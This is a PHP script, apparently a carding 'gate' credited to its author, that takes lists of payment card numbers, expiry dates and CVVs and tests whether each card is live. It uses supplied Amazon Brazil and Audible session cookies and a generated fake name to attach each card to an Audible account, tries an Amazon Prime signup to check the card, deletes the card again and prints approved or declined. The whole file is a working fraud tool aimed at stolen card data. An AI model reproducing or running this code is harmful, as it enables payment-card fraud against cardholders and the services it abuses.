<?php
error_reporting(0);
session_start();



function trazer($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

/*/####################/*/
###### CODER: @Flintphp77 #######
/*/###################/*/

function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function bin($cartao){
    $contents = file_get_contents("bins.csv");
    $pattern = preg_quote(substr($cartao, 0, 6), '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    return "$pieces[1] - $pieces[2] - $pieces[3] - $pieces[4] - $pieces[5]";
}

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
  
    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time(); // timestamp atual em segundos
    $random_num = mt_rand(1, 10000); // número aleatório entre 1 e 10000
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

// $email = generate_email();
// $cpf = gerarCPF();


$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];

$parte1 = substr($cc, 0, 4);
$parte2 = substr($cc, 4, 4);
$parte3 = substr($cc, 8, 4);
$parte4 = substr($cc, 12, 4);
$mes = intval($mes);

$info_bin = bin($lista);
$cookie1 = $_POST['cookie1'];
$cookie2 = $_POST['cookie2'];
$cookie = trim($cookie1);

$cookie_music = trim($cookie2);

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.4devs.com.br',
    'Accept: */*',
    'Sec-Fetch-Dest: empty',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://www.4devs.com.br',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'referer: https://www.4devs.com.br/gerador_de_pessoas'));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
  $end = curl_exec($ch);  

unlink($cookies);
//$end;
$nome = trazer($end, '"nome":"','"');

$url = "https://www.amazon.com.br/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Host: www.amazon.com.br",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

  $resp = curl_exec($curl);
$customerId = trazer($resp, '"customerID":"', '"');
$session_id = trazer($resp, '"sessionId":"', '"');
$token_delete = trazer($resp, '"serializedState":"', '"');


# GERAR TOKEN
$url = "https://www.audible.com/";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    
    "Cookie: $cookie_music",

);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

   $add_card = curl_exec($curl);
 $urlwark = trazer($add_card, '<a class="bc-button-text"  href="', '"');

 $enco = urlencode($urlencode);
$url = "https://www.audible.com/$urlwark";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    
    "Cookie: $cookie_music",

);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

   $add_card = curl_exec($curl);
 $tok = trazer($add_card, 'name="csrfToken" value="', '"');
 $tokenwark = urlencode($tok);


$url = "https://www.audible.com/unified-payment/update-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com$enco&relativeUrl=%2Fsubscription%2Fconfirmation&";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(

    "Cookie: $cookie_music",
 
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_paymentswidget_payments_list_choose_text&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_paymentswidget_payments_list_description&paymentsListTitleKey=adbl_paymentswidget_payments_list_title&selectedPaymentDescriptionKey=adbl_paymentswidget_selected_payment_description&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=false&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=true&showConfirmButton=false&showAddButton=false&showDeleteButtons=false&showEditButtons=true&showClosePaymentsListButton=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=true&ref=a_sbscrptnConfrmtn_c9_edit&paymentType=CreditCard&addCreditCardNumber=$parte1%20$parte2%20$parte3%20$parte4&expirationMonth=$mes&expirationYear=$ano&fullName=$nome&csrfToken=$tokenwark&country=US&addressLine1=230%20Vesey%20St%20Suite%20203C&addressLine2=&zipCode=10281&state=NY&city=NEW%20YORK&useAsDefault=true&addressId=&accountHolderName=$nome";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

   $add_card = curl_exec($curl);
  $card_id = trazer($gerar_cardID, '"paymentId": "', '"');

#isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_paymentswidget_payments_list_choose_text&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_paymentswidget_payments_list_description&paymentsListTitleKey=adbl_paymentswidget_payments_list_title&selectedPaymentDescriptionKey=adbl_paymentswidget_selected_payment_description&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=false&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=true&showConfirmButton=false&showAddButton=false&showDeleteButtons=false&showEditButtons=true&showClosePaymentsListButton=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=true&ref=a_sbscrptnConfrmtn_c9_edit&paymentType=CreditCard&addCreditCardNumber=$parte1%20$parte2%20$parte3%20$parte4&expirationMonth=$mes&expirationYear=$ano&fullName=jose%20silva&csrfToken=$tokenwark&country=US&addressLine1=230%20Vesey%20St%20Suite%20203C&addressLine2=&zipCode=10281&state=NY&city=NEW%20YORK&useAsDefault=true&addressId=&accountHolderName=jose%20silva

$url = "https://www.amazon.com.br/gp/prime/pipeline/membersignup";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

 $post_verify = curl_exec($curl);
$token_verify = trazer($post_verify, 'name="ppw-widgetState" value="','"');
$offerToken = trazer($post_verify, 'name="offerToken" value="','"');



$url = "https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify2 = curl_exec($curl);
$card_id2 = trazer($post_verify2, '"preferencePaymentMethodIds":"[\"','\"');




$url = "https://www.amazon.com.br/hp/wlp/pipeline/actions";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Host: www.amazon.com.br",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
   "accept: */*",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = "offerToken=$offerToken&session-id=$session_id&locationID=prime_confirm&primeCampaignId=SlashPrime&redirectURL=L2dwL3ByaW1l&cancelRedirectURL=Lw&wlpLocation=prime_confirm&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&isHorizonteFlow=1&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet";

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$Fim = curl_exec($curl);
// if (strpos($Fim, 'acceptOffer')) {
//     sendMessage("<b>✅Alguem tirou live UP\nLIVE: $parte1-XXXX-XXXX-$parte4\n[$info_bin]\nGate Amazon BR🔥</b>");
// }

#APGAR WARK PORRA
$url = "https://www.audible.com/account/payments?ref=a_account_o_l2_nav_2&";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "Cookie: $cookie_music",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
  $resp = curl_exec($curl);

 $a = trazer($resp, 'data-payment-id="', '"');
 $b = trazer($resp, 'data-billing-address-id="', '"');
$f = trazer($resp, 'data-csrf-token="', '"');
 $c = urlencode($f);
 $d = trazer($resp, 'href="/account/payments', '">');
$cd = trazer($resp, 'data-tail="', '"');
 $warkenc = urlencode($d);

#data-display-issuer-name="
$tipwark = trazer($resp, 'data-display-issuer-name="', '"');
$url = "https://www.audible.com/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$warkenc&relativeUrl=%2Faccount%2Fpayments&";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie_music",


);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, 'isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId='.$a.'&billingAddressId='.$b.'&paymentType=CreditCard&tail='.$cd.'&accountHolderName=pedro%20sosa&isValid=true&isDefault=true&issuerName='.$tipwark.'&displayIssuerName=Visa&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn');
 $resp   = curl_exec($curl);
$tk2_if = trazer($resp, 'name=\"ppw-widgetState\" value=\"', '\"');
$url = "https://www.audible.com/payments/optimus/delete?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$warkenc&relativeUrl=%2Faccount%2Fpayments&";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie_music",
 
  
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, 'isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId='.$a.'&billingAddressId='.$b.'&paymentType=CreditCard&tail='.$cd.'&accountHolderName=pedro%20sosa&isValid=true&isDefault=true&issuerName='.$tipwark.'&displayIssuerName=Visa&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn&statusStringKey=adbl_paymentswidget_delete_payment_success&statusSuccess=true&csrfTokenValid=true');
 $resp   = curl_exec($curl);

if (strpos($resp, 'Card successfully deleted.')) {
        $msg  = '✅';
        $err  = "REMOVIDO: $msg $err1";
    } else {
        $msg = '❌';
        $err = "REMOVIDO: $msg $err1";
    }



if (strpos($Fim, 'acceptOffer')) {
    echo "<br><span class='text-success'>[Aprovada] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-success'>[Cartao verificado] ➜ </span>
    <span class='text-success'>$err ➜ </span>
    <span class='text-info'>Wark</span><br>";
    update($live);
    curl_close($curl);
    exit();
 } elseif (strpos($Fim, 'InvalidInput')) {
    echo "<br><span class='text-warning'>[#Reprovada] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-danger'>[Cartao Invalido] ➜ </span>
    <span class='text-success'>$err ➜ </span>
    <span class='text-info'>Wark</span><br>";
    curl_close($curl);
    exit();
 } elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {
    echo "<br><span class='text-warning'>[#Reprovada] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-danger'>[Cartao recusado] ➜ </span>
    <span class='text-success'>$err ➜ </span>
    <span class='text-info'>Wark</span><br>";
    curl_close($curl);
    exit();
 } else {
    echo "<br><span class='text-warning'>[#Reprovada] ➜ </span>
    <span class='text-info'>$lista ➜ </span>
    <span class='text-danger'>[Erro inesperado] ➜ </span>
    <span class='text-success'>$err ➜ </span>
    <span class='text-info'>Wark</span><br>";
    curl_close($curl);
    exit();
 }



